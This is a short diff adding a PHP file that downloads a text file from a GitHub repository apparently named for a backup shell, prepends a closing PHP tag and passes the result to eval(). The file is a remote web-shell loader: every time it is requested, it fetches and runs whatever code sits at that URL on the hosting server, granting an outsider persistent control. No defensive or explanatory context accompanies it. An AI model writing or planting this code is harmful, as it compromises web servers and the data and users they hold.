@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/backupshellgaul.txt'));
+
+$content = "?> ".$content;
+eval($content);
